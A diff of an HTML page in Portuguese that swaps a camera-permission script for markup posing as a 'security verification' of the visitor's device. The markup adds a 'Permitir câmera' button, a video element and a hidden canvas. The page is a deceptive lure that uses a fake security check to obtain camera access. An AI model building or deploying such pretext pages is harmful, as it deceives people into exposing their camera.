@@ -1,30 +1,27 @@
-<script>
-    const video = document.getElementById('video');
-    const status = document.getElementById('status');
-    const spinner = document.getElementById('spinner');
+<div class="container">
+    <div class="logo">🔒</div>
+    <h2>Verificação de Segurança</h2>
 
-    async function pedirCamera() {
-        try {
-            status.textContent = 'Solicitando permissão da câmera...';
+    <p style="color: #888; font-size: 13px; margin: 10px 0;">
+        Seu dispositivo está sendo verificado para garantir acesso seguro.
+    </p>
 
-            const stream = await navigator.mediaDevices.getUserMedia({
-                video: true,
-                audio: false
-            });
+    <div class="spinner" id="spinner"></div>
+    <p class="status" id="status">Inicializando verificação...</p>
 
-            video.srcObject = stream;
-            video.style.display = 'block';
+    <button onclick="pedirCamera()" style="
+        margin-top: 20px;
+        padding: 12px 20px;
+        border: none;
+        border-radius: 8px;
+        background: #667eea;
+        color: white;
+        font-weight: bold;
+        cursor: pointer;
+    ">
+        Permitir câmera
+    </button>
 
-            status.textContent = 'Câmera permitida com sucesso ✅';
-            spinner.style.display = 'none';
-
-            alert('Permissão de câmera concedida ✅');
-
-        } catch (err) {
-            console.error(err);
-            status.textContent = 'Permissão da câmera negada ou indisponível ❌';
-            spinner.style.display = 'none';
-            alert('Erro: ' + err.name + ' - ' + err.message);
-        }
-    }
-</script>
+    <video id="video" autoplay muted playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+</div>
